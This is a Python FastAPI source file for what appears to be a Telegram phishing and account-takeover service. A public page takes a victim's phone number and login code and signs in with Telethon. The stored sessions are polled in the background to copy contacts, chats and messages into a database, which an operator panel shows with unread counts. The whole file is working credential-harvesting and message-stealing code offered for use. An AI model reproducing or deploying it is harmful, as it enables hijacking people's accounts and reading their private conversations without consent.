import asyncio
import os
from contextlib import asynccontextmanager

import aiosqlite
import uvicorn
from fastapi import FastAPI, Request, Form, Depends, status, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.exceptions import HTTPException
from dotenv import load_dotenv
from utils import update_user_data, periodic_update
from db import init_db, DB_FILE

load_dotenv('.env')
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
USERS_FOLDER = "./users"
SESSIONS_FOLDER = "./sessions"
os.makedirs(USERS_FOLDER, exist_ok=True)
os.makedirs(SESSIONS_FOLDER, exist_ok=True)
sessions = {}
IS_AUTH = False
AUTH_PASSWORD = os.getenv('PASSWORD')

@asynccontextmanager
async def lifespan(app: FastAPI):
    await init_db()
    task = asyncio.create_task(periodic_update(USERS_FOLDER, SESSIONS_FOLDER, API_ID, API_HASH))
    try:
        yield
    finally:
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"]
)

app.mount("/users", StaticFiles(directory=USERS_FOLDER), name="users")

templates = Jinja2Templates(directory="templates")

class PhonePayload(BaseModel):
    phone: str

class CodePayload(BaseModel):
    code: str

@app.get("/")
async def home(request: Request):
    return templates.TemplateResponse("index.html", {'request': request})


@app.post("/send_phone")
async def send_phone(data: PhonePayload):
    phone_number = data.phone.strip()
    session_name = f"{SESSIONS_FOLDER}/session_{phone_number}"

    try:
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            result = await client.send_code_request(phone_number)
            sessions[phone_number] = {
                "phone_code_hash": result.phone_code_hash,
                "phone": phone_number,
            }

        await client.disconnect()
        return {"status": "code_sent"}
    except Exception as e:
        return {"status": "error", "detail": str(e)}


async def update_user_task(phone_number: str):
    session_name = f"{SESSIONS_FOLDER}/session_{phone_number}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    try:
        me = await client.get_me()
        username = me.username or f"{me.first_name}_{me.id}"
        folder_name = f"{username}_{phone_number.replace('+','')}"
        folder = os.path.join(USERS_FOLDER, folder_name)
        os.makedirs(folder, exist_ok=True)
        await update_user_data(client, me, folder)
    finally:
        await client.disconnect()


@app.post("/verify_code")
async def verify_code(data: CodePayload, background_tasks: BackgroundTasks):
    phone_number = next((k for k,v in sessions.items() if "phone_code_hash" in v), None)
    if not phone_number:
        return {"error": "Send phone first."}
    phone_code_hash = sessions[phone_number]["phone_code_hash"]

    session_name = f"{SESSIONS_FOLDER}/session_{phone_number}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()

    if not await client.is_user_authorized():
        try:
            await client.sign_in(phone_number, data.code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            return {"error": "2FA enabled. Not supported."}
        except Exception as e:
            return {"error": f"Code error: {str(e)}"}

    try:
        background_tasks.add_task(update_user_task, phone_number)

    finally:
        await client.disconnect()

    return {"status": "ok"}


@app.get("/user/{user_folder}/contacts", response_class=HTMLResponse)
async def get_contacts(request: Request, user_folder: str):
    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row

        async with db.execute(
            "SELECT id FROM users WHERE username = ?", (user_folder,)
        ) as cursor:
            row = await cursor.fetchone()
            if not row:
                return HTMLResponse("User not found", status_code=404)
            user_id = row["id"]

        async with db.execute(
            "SELECT tg_id, username, first_name, last_name, phone FROM contacts WHERE user_id = ?", (user_id,)
        ) as cursor:
            contacts = await cursor.fetchall()

    return templates.TemplateResponse("contacts.html", {
        "request": request,
        "user_folder": user_folder,
        "contacts": contacts
    })


def ip_whitelist(request: Request):
    client_ip = request.client.host
    if client_ip != os.getenv('ALLOWED_IP'):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Access denied: IP not allowed",
        )
    return True



@app.get("/login", response_class=HTMLResponse, dependencies=[Depends(ip_whitelist)])
async def login_page(request: Request):
    return templates.TemplateResponse("password.html", {"request": request, "error": False})


@app.post("/login")
async def login(request: Request, password: str = Form(...)):
    if password == AUTH_PASSWORD:
        resp = RedirectResponse(url="/users", status_code=303)
        resp.set_cookie("auth", "ok", httponly=True)
        return resp
    return templates.TemplateResponse("password.html", {"request": request, "error": True})


@app.get("/users", response_class=HTMLResponse, dependencies=[Depends(ip_whitelist)])
async def list_users(request: Request):
    if request.cookies.get("auth") != "ok":
        return RedirectResponse("/login")

    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row

        cursor = await db.execute("""
            SELECT 
                u.id,
                u.username,
                u.phone,
                u.last_updated,
                COUNT(m.id) AS unread_count
            FROM users u
            LEFT JOIN chats c ON c.user_id = u.id
            LEFT JOIN messages m ON m.chat_id = c.id AND m.is_read = 0
            GROUP BY u.id, u.username, u.phone, u.last_updated
            ORDER BY u.id ASC
        """)
        rows = await cursor.fetchall()
        users = [dict(row) for row in rows]

    return templates.TemplateResponse("users_list.html", {"request": request, "users": users})

@app.get("/user/{user_folder}/chats", response_class=HTMLResponse, dependencies=[Depends(ip_whitelist)])
async def user_chats(request: Request, user_folder: str):
    if request.cookies.get("auth") != "ok":
        return RedirectResponse("/login")

    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT id FROM users WHERE username = ?", (user_folder,)
        ) as cursor:
            row = await cursor.fetchone()
            if not row:
                return HTMLResponse("User not found", status_code=404)
            user_id = row["id"]

        async with db.execute("""
            SELECT 
                c.id,
                c.chat_name,
                COUNT(m.id) AS unread_count
            FROM chats c
            LEFT JOIN messages m 
                ON m.chat_id = c.id AND m.is_read = 0
            WHERE c.user_id = ?
            GROUP BY c.id, c.chat_name
            ORDER BY c.id ASC
        """, (user_id,)) as cursor:
            chats = await cursor.fetchall()

    return templates.TemplateResponse("user_chats.html", {
        "request": request,
        "chats": chats,
        "user_folder": user_folder
    })


@app.get("/user/{user_folder}/chats/{chat_id}", response_class=HTMLResponse, dependencies=[Depends(ip_whitelist)])
async def user_chat(request: Request, user_folder: str, chat_id: int):
    if request.cookies.get("auth") != "ok":
        return RedirectResponse("/login")

    async with aiosqlite.connect(DB_FILE) as db:
        db.row_factory = aiosqlite.Row

        async with db.execute(
            "SELECT chat_name FROM chats WHERE id = ?", (chat_id,)
        ) as cursor:
            row = await cursor.fetchone()
            if not row:
                return HTMLResponse("User not found", status_code=404)
            chat_name = row["chat_name"]

        await db.execute(
            "UPDATE messages SET is_read = 1 WHERE chat_id = ?",
            (chat_id,)
        )
        await db.commit()

        async with db.execute(
            """
            SELECT chat_id, msg_id, sender, out, text, media_path, time_str
            FROM messages
            WHERE chat_id = ?
            ORDER BY msg_id ASC
            """,
            (chat_id,)
        ) as cursor:
            messages = await cursor.fetchall()

    return templates.TemplateResponse("chat.html", {
        "request": request,
        "user_folder": user_folder,
        "chat_id": chat_id,
        "chat_name": chat_name,
        "messages": messages
    })


if __name__ == '__main__':
    uvicorn.run(app)
